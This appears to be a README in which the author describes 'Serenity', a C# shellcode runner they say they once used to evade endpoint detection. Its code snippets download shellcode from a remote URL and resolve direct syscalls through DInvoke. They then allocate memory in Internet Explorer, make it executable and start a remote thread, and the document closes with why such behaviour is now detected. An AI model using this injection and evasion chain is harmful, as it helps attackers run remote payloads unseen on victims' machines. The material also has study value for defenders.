# Disclaimer
I stopped using this when APT-37 was observed [exploiting Internet Explorer](https://blog.google/threat-analysis-group/internet-explorer-0-day-exploited-by-north-korean-actor-apt37/) and as a result, I noticed that a week after that my malware was getting identified by MDE, which resultant, led to detections in nearly every other EDR. I did switch to Microsoft Edge, which kept it going for a few more months, but ultimately I had to put it down. It will take significant rewrites to get this bypassing EDR once again, as well as rewrites to adapt to modern day .NET and VS Studio.
# Technical Info
Serenity was a C# shellcode runner I made and used a few years ago to bypass EDR. It leverages DInvoke, a .NET library that will let you use direct system call invocation. EDR hooks traditional Windows API calls like ```OpenProcess```, ```VirtualAllocEx```, thus, DInvoke uses native system calls at runtime as an alternative.

First and foremost, it utilizes ```HttpClient``` to fetch the shellcode from a remote URL, and stores it as a byte array in memory - which was better than on disk. However, if your domain didn't have good reputation, this entire process was burnt.
```
byte[] shellcode;
using (var client = new HttpClient())
{
    shellcode = await client.GetByteArrayAsync("http://example.com/update.bin");
}
```
The address of ```NtOpenProcess``` is dynamically resolved by ```Generic.GetSyscallStub()``` at runtime - which bypasses user-mode hooks.
```
var ptr = Generic.GetSyscallStub("NtOpenProcess");
var ntOpenProcess = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtOpenProcess)) 
    as Native.DELEGATES.NtOpenProcess;
```
Next, there's the memory allocation and injection
```
var ptr = Generic.GetSyscallStub("NtAllocateVirtualMemory");
var ntAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtAllocateVirtualMemory)) 
    as Native.DELEGATES.NtAllocateVirtualMemory;

ntAllocateVirtualMemory(hProcess, ref hMemory, IntPtr.Zero, ref regionSize, 
    Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, Win32.WinNT.PAGE_READWRITE);
```
Instead of using ```VirtualAllocEx``` I was using ```NtAllocateVirtualMemory``` directly to allocate memory in IE. The protection was later changed to ```PAGE_EXECUTE_READ``` using ```NtProtectVirtualMemory```.

For the final step, the actual execution is utilizing ```NtCreateThreadEx``` which created a thread while avoiding API hooks, unlike ```CreateRemoteThread```.
```
var ptr = Generic.GetSyscallStub("NtCreateThreadEx");
var ntCreateThreadEx = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtCreateThreadEx)) 
    as Native.DELEGATES.NtCreateThreadEx;

var status = ntCreateThreadEx(out _, Win32.WinNT.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, hProcess, hMemory, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
```

Why this malware is dead in 2025:
- I mean, first and foremost, ```iexplore.exe``` spawning threads with shellcode is suss.
- ```NtAllocateVirtualMemory``` and ```NtCreateThreadEx``` are monitored heavily now, and being called in such quick succession is a red flag.
- Kernel-level syscall monitoring
- A million other behavioral indicators, another being Symon/ETW.
